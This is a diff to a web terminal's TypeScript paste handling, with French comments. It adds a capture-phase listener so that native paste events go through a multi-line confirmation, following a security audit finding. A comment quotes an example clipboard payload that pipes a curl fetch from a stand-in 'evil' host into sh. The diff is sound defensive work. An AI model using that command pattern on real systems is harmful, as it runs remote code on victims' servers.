@@ -60,13 +60,16 @@ window.addEventListener("keydown", (e) => {
 // tout seul. Écrire les octets bruts (ce que faisaient Ctrl+Maj+V et le menu
 // « Coller ») court-circuitait cette protection : une page web hostile plaçant
 // « cmd\ncurl http://evil|sh\n » dans le presse-papiers faisait exécuter la
-// seconde ligne sur le serveur, invisible. Le collage natif Ctrl+V, lui, passait
-// déjà par onData et était protégé. On confirme en plus tout collage multi-ligne,
-// car le distant peut ne pas avoir activé le bracketed paste.
+// seconde ligne sur le serveur, invisible. Le collage natif (événement `paste`,
+// que xterm envoie à onData) n'était PAS protégé pour autant : il échappait à la
+// confirmation, d'où intercepterCollageNatif plus bas (audit du 12 septembre
+// 2026, FS-2). On confirme tout collage multi-ligne, car le distant peut ne pas
+// avoir activé le bracketed paste.
 // La décision (vide → rien ; multi-ligne → confirmer ; puis coller) vit dans
 // effectuerCollage, pure et testée ; ici on ne fait que brancher term.paste et
 // la modale de confirmation.
-export function collerDansTerminal(term: Terminal, texte: string): Promise<void> {
+// Seul `paste` est lu : le type le dit, et les tests passent un double minimal.
+export function collerDansTerminal(term: Pick<Terminal, "paste">, texte: string): Promise<void> {
   return effectuerCollage(texte, {
     coller: (t) => term.paste(t),
     confirmer: (n) =>
@@ -75,6 +78,29 @@ export function collerDansTerminal(term: Terminal, texte: string): Promise<void>
         { ok: t("coller"), danger: true },
       ),
   });
+}
+
+/** Fait passer tout collage NATIF dans `el` (Maj+Inser, clic du milieu, menu
+ *  contextuel du navigateur, événement `paste`) par `collerDansTerminal`.
+ *
+ *  Audit sécurité du front du 12 septembre 2026 (FS-2) : xterm écoute `paste`
+ *  sur sa zone de saisie et envoie le texte droit à `onData`, donc à
+ *  `pty_write`, sans la confirmation multi-ligne que Ctrl+Maj+V impose. Le
+ *  commentaire ci-dessus disait ce chemin « protégé » par le bracketed paste :
+ *  il ne l'est que si le distant l'a activé, et le texte peut refermer le bloc
+ *  (FS-1). L'écouteur est posé en CAPTURE sur le conteneur : il passe avant
+ *  celui de xterm, placé plus bas dans l'arbre, et `stopImmediatePropagation`
+ *  l'empêche de l'atteindre. `preventDefault` retient l'insertion native. */
+export function intercepterCollageNatif(el: HTMLElement, term: Pick<Terminal, "paste">): void {
+  el.addEventListener(
+    "paste",
+    (ev) => {
+      ev.preventDefault();
+      ev.stopImmediatePropagation();
+      void collerDansTerminal(term, ev.clipboardData?.getData("text/plain") ?? "");
+    },
+    true,
+  );
 }
 
 let confirmResolve: ((v: boolean) => void) | null = null;
